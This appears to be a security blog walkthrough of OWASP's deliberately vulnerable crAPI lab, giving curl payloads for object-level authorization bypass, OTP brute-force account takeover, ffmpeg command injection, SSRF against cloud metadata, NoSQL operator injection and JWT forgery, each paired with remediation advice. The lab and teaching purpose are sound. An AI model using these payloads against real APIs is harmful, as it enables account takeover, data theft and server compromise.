---
title: "OWASP crAPI — Complete Exploitation Walkthrough"
date: 2026-09-22 09:10:00 +0000
categories: [Damn Vulnerable Applications]
tags: [crAPI, OWASP, API Security, BOLA, SSRF, NoSQL Injection, JWT, Docker]
description: "Exploiting the OWASP Completely Ridiculous API (crAPI) mapped to the API Security Top 10: BOLA, broken auth/OTP brute force, excessive data exposure, BFLA, mass assignment, SSRF, NoSQLi and JWT attacks."
author: Paschal Sangawe
toc: true
---

**crAPI (Completely Ridiculous API)** is OWASP's intentionally-vulnerable API, built to demonstrate the **OWASP API Security Top 10**. It models a vehicle-services platform: users register, add vehicles, buy products, message mechanics, and upload videos. It is the natural API companion to DVWA (web) and DVGA (GraphQL).

This post maps each crAPI challenge to the API Security Top 10, with the endpoints and payloads I used.

> **Authorisation:** crAPI is deliberately vulnerable and meant to run locally. Everything below was tested on my own instance.

{% raw %}

## Setup

```bash
mkdir crapi && cd crapi
curl -o docker-compose.yml https://raw.githubusercontent.com/OWASP/crAPI/main/deploy/docker/docker-compose.yml
docker compose pull && docker compose up -d
```

- Web UI: `http://localhost:8888` · API: `http://localhost:8888/api`
- Mail catcher (MailHog): `http://localhost:8025`
- For the SSRF / unsafe-consumption challenges, add the documented hosts entries:

```text
127.0.0.1 crapi-web
127.0.0.1 crapi-api
```

Register two users (attacker + victim) and capture the `Authorization: Bearer <JWT>` token from login.

## API1 — Broken Object Level Authorization (BOLA)
> **Picture goes here (#1).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `curl -s http://localhost:8888/identity/api/v2/vehicle/<victimVehicleId>/location \`.
> _Save as_ `images/crapi-walkthrough/1.png` _then replace this block with_ `![API1 — Broken Object Level Authorization (BOLA)](/images/crapi-walkthrough/1.png)`_._


**Access another user's vehicle location.** The vehicle ID is sequential/predictable and the endpoint never checks ownership:

```bash
curl -s http://localhost:8888/identity/api/v2/vehicle/<victimVehicleId>/location \
  -H "Authorization: Bearer $ATTACKER_JWT"
```

> **Picture goes here (#2).** Capture this request/response or command step in Burp/terminal. Key line: `curl -s http://localhost:8888/identity/api/v2/vehicle/<victimVehicleId>/location \`.
> _Save as_ `images/crapi-walkthrough/2.png` _then replace this block with_ `![API1 — Broken Object Level Authorization (BOLA)](/images/crapi-walkthrough/2.png)`_._


**Access another user's mechanic report:**

```bash
curl -s "http://localhost:8888/workshop/api/mechanic/mechanic_report?report_id=<id>" \
  -H "Authorization: Bearer $ATTACKER_JWT"
```

> **Picture goes here (#3).** Capture this request/response or command step in Burp/terminal. Key line: `curl -s "http://localhost:8888/workshop/api/mechanic/mechanic_report?report_id=<id>" \`.
> _Save as_ `images/crapi-walkthrough/3.png` _then replace this block with_ `![API1 — Broken Object Level Authorization (BOLA)](/images/crapi-walkthrough/3.png)`_._


**Lesson:** authorize every object access against the authenticated user (`WHERE id=? AND owner_id=?`), and use unpredictable IDs. This is consistently the #1 API risk.

> **Picture goes here (#4).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
> _Save as_ `images/crapi-walkthrough/4.png` _then replace this block with_ `![API1 — Broken Object Level Authorization (BOLA)](/images/crapi-walkthrough/4.png)`_._

## API2 — Broken Authentication (OTP brute force → account takeover)
> **Picture goes here (#5).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `curl -s -X POST http://localhost:8888/identity/api/auth/v2/check-otp \`.
> _Save as_ `images/crapi-walkthrough/5.png` _then replace this block with_ `![API2 — Broken Authentication (OTP brute force → account takeover)](/images/crapi-walkthrough/5.png)`_._


The password-reset flow uses a **4-digit OTP** with no rate limiting. Request a reset for the victim, then brute-force `0000–9999` against the check endpoint with a new password:

```bash
curl -s -X POST http://localhost:8888/identity/api/auth/v2/check-otp \
  -H 'Content-Type: application/json' \
  -d '{"email":"victim@example.com","otp":"1234","password":"NewPass@123"}'
```

> **Picture goes here (#6).** Capture this request/response or command step in Burp/terminal. Key line: `curl -s -X POST http://localhost:8888/identity/api/auth/v2/check-otp \`.
> _Save as_ `images/crapi-walkthrough/6.png` _then replace this block with_ `![API2 — Broken Authentication (OTP brute force → account takeover)](/images/crapi-walkthrough/6.png)`_._


A 10,000-key space is trivial to exhaust; the correct OTP resets the victim's password → **full account takeover**. The same flow exists under a different version path (`/v3/check-otp`), illustrating API9 (see below).

**Lesson:** rate-limit OTP verification, use longer/expiring OTPs, bind them to the session, and cap attempts.

> **Picture goes here (#7).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
> _Save as_ `images/crapi-walkthrough/7.png` _then replace this block with_ `![API2 — Broken Authentication (OTP brute force → account takeover)](/images/crapi-walkthrough/7.png)`_._

## API3 — Excessive Data Exposure
> **Picture goes here (#8).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `curl -s http://localhost:8888/community/api/v2/community/posts/recent \`.
> _Save as_ `images/crapi-walkthrough/8.png` _then replace this block with_ `![API3 — Excessive Data Exposure](/images/crapi-walkthrough/8.png)`_._


`GET /community/api/v2/community/posts/recent` returns full nested objects — user email, vehicle details and more — far beyond what the UI needs:

```bash
curl -s http://localhost:8888/community/api/v2/community/posts/recent \
  -H "Authorization: Bearer $ATTACKER_JWT"
```

> **Picture goes here (#9).** Capture this request/response or command step in Burp/terminal. Key line: `curl -s http://localhost:8888/community/api/v2/community/posts/recent \`.
> _Save as_ `images/crapi-walkthrough/9.png` _then replace this block with_ `![API3 — Excessive Data Exposure](/images/crapi-walkthrough/9.png)`_._


The leaked **vehicle ID** here feeds the BOLA attack above — a classic chained finding.

**Lesson:** return only the fields the client needs (use DTOs/serializers), never the raw database object.

> **Picture goes here (#10).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
> _Save as_ `images/crapi-walkthrough/10.png` _then replace this block with_ `![API3 — Excessive Data Exposure](/images/crapi-walkthrough/10.png)`_._

## API4 — Lack of Resources & Rate Limiting
> **Picture goes here (#11).** Capture a Burp request (or terminal command) for this lab, showing the payload you send.
> _Save as_ `images/crapi-walkthrough/11.png` _then replace this block with_ `![API4 — Lack of Resources & Rate Limiting](/images/crapi-walkthrough/11.png)`_._


Beyond the OTP brute force, there is no meaningful throttling on login, signup, or coupon application. Batch/rapid requests are accepted freely, enabling credential stuffing and resource abuse.

**Lesson:** rate-limit per identity and per IP, add lockouts and CAPTCHA, and monitor for enumeration patterns.

> **Picture goes here (#12).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
> _Save as_ `images/crapi-walkthrough/12.png` _then replace this block with_ `![API4 — Lack of Resources & Rate Limiting](/images/crapi-walkthrough/12.png)`_._

## API5 — Broken Function Level Authorization (BFLA)
> **Picture goes here (#13).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `curl -s http://localhost:8888/workshop/api/shop/orders/all \`.
> _Save as_ `images/crapi-walkthrough/13.png` _then replace this block with_ `![API5 — Broken Function Level Authorization (BFLA)](/images/crapi-walkthrough/13.png)`_._


A regular user can call administrative-style functions. For example, an "all orders" endpoint is reachable without an admin role:

```bash
curl -s http://localhost:8888/workshop/api/shop/orders/all \
  -H "Authorization: Bearer $ATTACKER_JWT"
```

> **Picture goes here (#14).** Capture this request/response or command step in Burp/terminal. Key line: `curl -s http://localhost:8888/workshop/api/shop/orders/all \`.
> _Save as_ `images/crapi-walkthrough/14.png` _then replace this block with_ `![API5 — Broken Function Level Authorization (BFLA)](/images/crapi-walkthrough/14.png)`_._


Similarly, `DELETE /identity/api/v2/user/videos/{video_id}` can be called for **another user's** video (BOLA + BFLA).

**Lesson:** enforce role/function checks server-side on every endpoint; never rely on the UI hiding admin functions.

> **Picture goes here (#15).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
> _Save as_ `images/crapi-walkthrough/15.png` _then replace this block with_ `![API5 — Broken Function Level Authorization (BFLA)](/images/crapi-walkthrough/15.png)`_._

## API6 — Mass Assignment
> **Picture goes here (#16).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `curl -s -X PUT http://localhost:8888/identity/api/v2/user/videos/<video_id> \`.
> _Save as_ `images/crapi-walkthrough/16.png` _then replace this block with_ `![API6 — Mass Assignment](/images/crapi-walkthrough/16.png)`_._


The video-update endpoint binds submitted JSON onto the object without an allow-list. The `conversion_params` field is later passed to `ffmpeg`, so a mass-assigned value becomes **command injection → RCE**:

```bash
curl -s -X PUT http://localhost:8888/identity/api/v2/user/videos/<video_id> \
  -H "Authorization: Bearer $ATTACKER_JWT" -H 'Content-Type: application/json' \
  -d '{"conversion_params":"-vcodec h264 -vf \"scale=...; touch /tmp/pwned\""}'
```

> **Picture goes here (#17).** Capture this request/response or command step in Burp/terminal. Key line: `curl -s -X PUT http://localhost:8888/identity/api/v2/user/videos/<video_id> \`.
> _Save as_ `images/crapi-walkthrough/17.png` _then replace this block with_ `![API6 — Mass Assignment](/images/crapi-walkthrough/17.png)`_._


Trigger the conversion and the injected command runs server-side.

**Lesson:** bind request data to explicit DTOs/allow-lists; never pass user-controlled parameters into shell/ffmpeg invocations.

> **Picture goes here (#18).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
> _Save as_ `images/crapi-walkthrough/18.png` _then replace this block with_ `![API6 — Mass Assignment](/images/crapi-walkthrough/18.png)`_._

## API7 — Server-Side Request Forgery (SSRF)
> **Picture goes here (#19).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `curl -s -X POST http://localhost:8888/workshop/api/merchant/contact_mechanic \`.
> _Save as_ `images/crapi-walkthrough/19.png` _then replace this block with_ `![API7 — Server-Side Request Forgery (SSRF)](/images/crapi-walkthrough/19.png)`_._


The "contact mechanic" feature takes a `mechanic_api` URL and fetches it server-side with no validation:

```bash
curl -s -X POST http://localhost:8888/workshop/api/merchant/contact_mechanic \
  -H "Authorization: Bearer $ATTACKER_JWT" -H 'Content-Type: application/json' \
  -d '{"mechanic_api":"http://169.254.169.254/latest/meta-data/","repeat_request":1,"mechanic_code":"TRAC","problem_details":"test","vin":"<vin>"}'
```

> **Picture goes here (#20).** Capture this request/response or command step in Burp/terminal. Key line: `curl -s -X POST http://localhost:8888/workshop/api/merchant/contact_mechanic \`.
> _Save as_ `images/crapi-walkthrough/20.png` _then replace this block with_ `![API7 — Server-Side Request Forgery (SSRF)](/images/crapi-walkthrough/20.png)`_._


Point it at cloud metadata, internal services, or `crapi-api`/`crapi-web` to reach internal-only routes.

**Lesson:** allow-list destination hosts/schemes, resolve and block private/loopback/link-local ranges, and don't follow redirects blindly.

> **Picture goes here (#21).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
> _Save as_ `images/crapi-walkthrough/21.png` _then replace this block with_ `![API7 — Server-Side Request Forgery (SSRF)](/images/crapi-walkthrough/21.png)`_._

## API8 — Security Misconfiguration
> **Picture goes here (#22).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `OPTIONS`.
> _Save as_ `images/crapi-walkthrough/22.png` _then replace this block with_ `![API8 — Security Misconfiguration](/images/crapi-walkthrough/22.png)`_._


Verbose errors, permissive CORS, and missing hardening across the stack. Always check `OPTIONS`, error bodies and response headers for leaked stack traces, allowed methods and reflected `Origin`.

> **Picture goes here (#23).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
> _Save as_ `images/crapi-walkthrough/23.png` _then replace this block with_ `![API8 — Security Misconfiguration](/images/crapi-walkthrough/23.png)`_._

## API9 — Improper Inventory Management
> **Picture goes here (#24).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `/identity/api/auth/v2/check-otp`.
> _Save as_ `images/crapi-walkthrough/24.png` _then replace this block with_ `![API9 — Improper Inventory Management](/images/crapi-walkthrough/24.png)`_._


Older API versions remain live alongside current ones — e.g. `/identity/api/auth/v2/check-otp` vs `/v3/check-otp`, and `/workshop/api/v1/...` endpoints. Deprecated versions often lack the fixes applied to newer ones.

**Lesson:** maintain an accurate API inventory, retire old versions, and never assume "v2 is the only one".

> **Picture goes here (#25).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
> _Save as_ `images/crapi-walkthrough/25.png` _then replace this block with_ `![API9 — Improper Inventory Management](/images/crapi-walkthrough/25.png)`_._

## API10 — Unsafe Consumption of Third-Party APIs
> **Picture goes here (#26).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `curl -s -X POST http://localhost:8888/workshop/api/shop/apply_coupon \`.
> _Save as_ `images/crapi-walkthrough/26.png` _then replace this block with_ `![API10 — Unsafe Consumption of Third-Party APIs](/images/crapi-walkthrough/26.png)`_._


crAPI trusts a **third-party mechanic API** and consumes its responses without validation. By controlling that upstream response (via SSRF or a malicious mechanic service), you can influence crAPI's behaviour and data.

**Lesson:** treat third-party API responses as untrusted — validate schemas, sanitise values, and apply timeouts/allow-lists.

## JWT and NoSQL injection extras

- **JWT:** crAPI's tokens can be abused via weak/forgeable claims — test `alg:none`, weak secrets (`hashcat -m 16500`) and claim tampering (`sub`/`role`).
- **NoSQL injection (coupon):** the coupon check passes JSON straight to MongoDB, so operators bypass validation:

```bash
curl -s -X POST http://localhost:8888/workshop/api/shop/apply_coupon \
  -H "Authorization: Bearer $ATTACKER_JWT" -H 'Content-Type: application/json' \
  -d '{"coupon_code":{"$ne":""}}'
```

## Challenge → OWASP mapping

| crAPI challenge | OWASP API Top 10 |
|-----------------|------------------|
| Vehicle/report IDOR | API1 BOLA |
| OTP brute-force password reset | API2 Broken Auth / API4 Rate Limiting |
| Community feed over-exposure | API3 Excessive Data Exposure |
| `orders/all`, delete others' videos | API5 BFLA |
| `conversion_params` → RCE | API6 Mass Assignment |
| Contact-mechanic URL fetch | API7 SSRF |
| Verbose errors / CORS | API8 Misconfiguration |
| v2/v3 endpoints both live | API9 Improper Inventory |
| Third-party mechanic API trust | API10 Unsafe Consumption |

## Remediation checklist

- Enforce **object-level authorization** on every endpoint; use unguessable IDs.
- Rate-limit and lock out OTP/login/reset flows; use long, expiring, session-bound OTPs.
- Return **minimal** fields; never serialize DB objects directly.
- Enforce **role/function** checks server-side on every route.
- Bind request bodies to **DTO allow-lists**; never feed user input to a shell.
- Validate SSRF destinations against host/scheme allow-lists and block internal ranges.
- Harden defaults, disable verbose errors, restrict CORS, and set security headers.
- Inventory and **retire** old API versions.
- Validate third-party API responses; use timeouts and least privilege.
- Verify JWT signatures with strong secrets; reject `alg:none`; parameterise database queries.

## Related posts

- [Damn Vulnerable Web Application (DVWA)](/posts/dvwa-walkthrough/)
- [Damn Vulnerable GraphQL Application (DVGA)](/posts/dvga-walkthrough/)
- [PortSwigger API Testing labs](/posts/portswigger-api-testing-labs/)
- [PortSwigger NoSQL Injection labs](/posts/portswigger-nosql-injection-labs/)

{% endraw %}

> **Picture goes here (#27).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
> _Save as_ `images/crapi-walkthrough/27.png` _then replace this block with_ `![Related posts](/images/crapi-walkthrough/27.png)`_._
